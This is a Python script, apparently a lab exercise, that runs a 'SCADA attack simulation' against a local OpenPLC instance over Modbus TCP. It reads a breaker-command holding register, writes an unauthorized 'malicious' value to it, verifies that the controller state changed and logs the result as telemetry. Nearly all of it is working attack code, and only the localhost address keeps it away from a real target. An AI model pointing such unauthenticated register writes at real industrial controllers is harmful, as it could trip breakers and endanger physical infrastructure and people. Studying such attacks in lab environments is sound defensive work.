from pymodbus.client import ModbusTcpClient
import json
from datetime import datetime

PLC_IP = "127.0.0.1"
PLC_PORT = 502

BREAKER_REGISTER = 1024

NORMAL_STATE = 0
MALICIOUS_STATE = 1

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

print("=" * 60)
print("SMARTCITY-X SCADA ATTACK SIMULATION")
print("=" * 60)

# ---------------------------------------------------------
# CONNECT
# ---------------------------------------------------------

print("\n[RECONNAISSANCE]")
print(f"Target: {PLC_IP}:{PLC_PORT}")
print("Protocol: Modbus TCP")

if not client.connect():
    print("[ERROR] Could not connect to OpenPLC")
    raise SystemExit

print("[+] Modbus connection established")

# ---------------------------------------------------------
# READ CURRENT PLC STATE
# ---------------------------------------------------------

print("\n[READ OPERATION]")
print(f"Reading holding register: {BREAKER_REGISTER}")

result = client.read_holding_registers(
    address=BREAKER_REGISTER,
    count=1
)

if result.isError():
    print("[ERROR] Failed to read breaker register")
    client.close()
    raise SystemExit

original_value = result.registers[0]

print(f"[+] Current Breaker Command: {original_value}")

# ---------------------------------------------------------
# ATTACK
# ---------------------------------------------------------

print("\n" + "=" * 60)
print("ATTACK PHASE")
print("=" * 60)

print("[ATTACK] Unauthorized Modbus write initiated")
print(f"[ATTACK] Target register: {BREAKER_REGISTER}")
print(f"[ATTACK] Original value: {original_value}")
print(f"[ATTACK] Malicious value: {MALICIOUS_STATE}")

write_result = client.write_register(
    address=BREAKER_REGISTER,
    value=MALICIOUS_STATE
)

if write_result.isError():
    print("[ERROR] Modbus write failed")
    client.close()
    raise SystemExit

print("[+] Unauthorized register modification successful")

# ---------------------------------------------------------
# VERIFY IMPACT
# ---------------------------------------------------------

verify = client.read_holding_registers(
    address=BREAKER_REGISTER,
    count=1
)

if verify.isError():
    print("[ERROR] Could not verify modified state")
    client.close()
    raise SystemExit

observed_value = verify.registers[0]

print("\n[IMPACT]")
print(f"Breaker Command: {observed_value}")

if observed_value != original_value:
    print("[!] PLC CONTROL STATE HAS CHANGED")

# ---------------------------------------------------------
# TELEMETRY
# ---------------------------------------------------------

telemetry = {
    "timestamp": datetime.now().isoformat(),
    "target": "OpenPLC",
    "ip": PLC_IP,
    "port": PLC_PORT,
    "protocol": "Modbus TCP",
    "register": BREAKER_REGISTER,
    "variable": "%MW0",
    "normal_value": original_value,
    "observed_value": observed_value,
    "unauthorized_write": observed_value != original_value,
    "attack": "SCADA CONTROL MANIPULATION"
}

with open("scada_telemetry.json", "w") as f:
    json.dump(telemetry, f, indent=4)

print("\n[+] SCADA telemetry saved")
print("[+] Attack simulation complete")

client.close()

print("[+] Connection closed")